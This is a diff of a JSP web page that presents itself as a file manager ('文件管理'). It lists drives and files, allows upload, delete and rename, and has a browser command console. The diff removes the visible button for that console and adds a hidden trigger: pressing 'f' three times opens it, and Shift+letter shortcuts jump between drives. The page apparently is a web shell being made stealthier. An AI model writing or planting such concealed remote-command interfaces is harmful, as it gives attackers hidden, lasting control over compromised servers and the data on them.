@@ -76,28 +76,24 @@
 </style>
 <script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"> </script>
 <script type="text/javascript">
+     
 	function rename(ele) {
 		var namecol=ele.parentElement.previousElementSibling.previousElementSibling.previousElementSibling
 		var showoldname=namecol.innerHTML.split(">")[1].split("<")[0]
 		var inhtml= '<form method="post"><input type="hidden" name="oldName" value="'+showoldname+'"><input size="30" type="text" name="newName" value='+showoldname+'><input type="submit" value="保存"></form>'
 		namecol.innerHTML=inhtml;
 	}
- 
+	
 	function switchDiv() {
+		var inx=$("#CommandDiv").children("input").get(0);
 		var fileList=$(".fileListTable");
 		var Command=$("#CommandDiv")
 		if(fileList.css('display') == "block"){
-			fileList.css('display','none');
+			fileList.css('display','none'); 
 			fileList.css('visibility','hidden');
 			Command.css('display','block');
-			  function keyDown(e) {
-			       var keycode = e.which;
-			       if(eval(keycode==13)){
-			    	   $("div").children("input")[1].click();
-			    	   }
-			       }
-			    
-			   document.onkeydown = keyDown;
+			inx.value="";
+		 	inx.focus();
 		}else{
 			Command.css('display','none');
 			fileList.css('display','block');
@@ -117,10 +113,51 @@
 		inx.focus();
 	}
 	window.onload=function(){
+		
 		 $("tr:even").css('background-color','#FDF5E6');	 
 		 $("tr:odd").css('background-color','#FAFAD2');
 		 switchDiv();
 		 switchDiv();
+		 var index=0;
+		 var msgDiv=$(".root").children("table").find("[colspan='10']").get(0);
+		 var to = $(".root").children("table").find("a");
+		 function keyDown(e) {
+			var keyCode = e.which||e.keyCode;
+		    if(eval(keyCode==13)){
+		    	 $("div").children("input")[1].click();
+		    }else if(keyCode==102)  {
+		         index++;
+		         if(index==3){ 
+		        	 index=0;
+		        	 switchDiv(); 
+		         }
+			}else if(e.shiftKey && keyCode == 67){//C
+			 	 location.replace(to.get(0));
+			  	 msgDiv.innerHTML="跳转到C:";
+			} else if(e.shiftKey && keyCode == 68){//D
+			  	 location.replace(to.get(1));
+			 	 msgDiv.innerHTML="跳转到D:";
+			} else if(e.shiftKey && keyCode == 69){//E
+			  	 location.replace(to.get(2));
+			 	 msgDiv.innerHTML="跳转到E:";
+			} else if(e.shiftKey && keyCode == 70){//F
+			 	 location.replace(to.get(3));
+			 	 msgDiv.innerHTML="跳转到F:";
+			} else if(e.shiftKey && keyCode == 71){//G
+				 location.replace(to.get(4));
+				 msgDiv.innerHTML="跳转到G:";
+			} else if(e.shiftKey && keyCode == 72){//H
+				 location.replace(to.get(5));
+				 msgDiv.innerHTML="跳转到H:";
+			} else if(e.shiftKey && keyCode == 73){//I
+				 location.replace(to.get(6));
+				 msgDiv.innerHTML="跳转到I:";
+			} else if(e.shiftKey && keyCode == 74){//J
+				 location.replace(to.get( 7));
+				 msgDiv.innerHTML="跳转到J:";
+			}
+		} 
+		document.onkeydown = keyDown;
 	}
 </script>
 </head>
@@ -220,7 +257,7 @@ if(newname!=null){
 		String fiSizeStr="<td>"+(file.length()/1024>1024?file.length()/1024/1024+"MB":file.length()/1024+"KB")+"</td>";
 		//String dirSizeStr="<td>"+(size/1024>1024?size/1024/1024+"MB":size/1024+"KB")+"</td>";
 		if(ac.equals("isRoot")){
-		    tag= " <td><a href='"+ url+"?dir="+ encode(file.getPath())+"&action=list'>"+file.getPath()+"</a></td> ";
+		    tag= "<td><a href='"+ url+"?dir="+ encode(file.getPath())+"&action=list'>"+file.getPath().substring(0, 2)+"</a></td>";
 		}else if(ac.equals("isDir")){
 		    tag= "<tr><td id='folder'><img src='"+imgencode64(file)+"'/> </td><td><a href='"+ url+"?dir="+encode(file.getPath())+"&action=list'>"+file.getName()+"</a></td>"
 			     +"<td></td>"+"<td>"+requrlStr+"del'>删除  </a></td>"+renameStr+"<td></td>"+fhiddeStr+fReadsStr+CreateTime+"</tr>";
@@ -473,27 +510,26 @@ if(newname!=null){
 	 %>
 	<div class="title" align="center">
 		<h1><a href="<%=url%>">文件管理</a></h1>
-		<span><button onclick="switchDiv()">切换</button></span>
 	</div>
 	<div class="root">
-	<table>
-	<tr>
-		<%for(File x:FileRoot)out.println(ListPath( "isRoot",x));%>
-		<td>
-			<form  enctype="multipart/form-data" method="post">
-				<input type="submit" value="上传至当前目录 " size="50">
-			    <input  type="file" name="file" size="30"  >  
-			</form>
-		</td>
-		<td>
-			<input type="button" value="返回上级目录" onclick="window.history.back()">
-		</td>
-	</tr>
-	<tr>
-		<td colspan="2" style="min-width:80px;">当前目录 </td>
-		<td colspan="10"> <%=msg%></td>
-	<tr/>
-	</table>
+		<table>
+		<tr>
+			<%for(File x:FileRoot)out.println(ListPath( "isRoot",x));%>
+			<td>
+				<form  enctype="multipart/form-data" method="post">
+					<input type="submit" value="上传至当前目录 " size="50">
+				    <input  type="file" name="file" size="30"  >  
+				</form>
+			</td>
+			<td>
+				<input type="button" value="返回上级目录" onclick="window.history.back()">
+			</td>
+		</tr>
+		<tr>
+			<td colspan="2" style="min-width:80px;">当前目录 </td>
+			<td colspan="10"><%=msg%></td>
+		<tr/>
+		</table>
 	</div>
  <div class="fileListTable">
 	<table class="filelist">
@@ -580,7 +616,6 @@ if(newname!=null){
 	}
  %>
    </table></div> 
-<div id="CommandDiv">
-	<input type="text" name="commandStr"><input type="submit" onclick="sendCommand(this.previousSibling)"><textarea rows='33'></textarea>
+<div id="CommandDiv"><input type="text" name="commandStr"><input type="submit" onclick="sendCommand(this.previousSibling)"><textarea rows='33'></textarea>
 </div></body>
 </html>
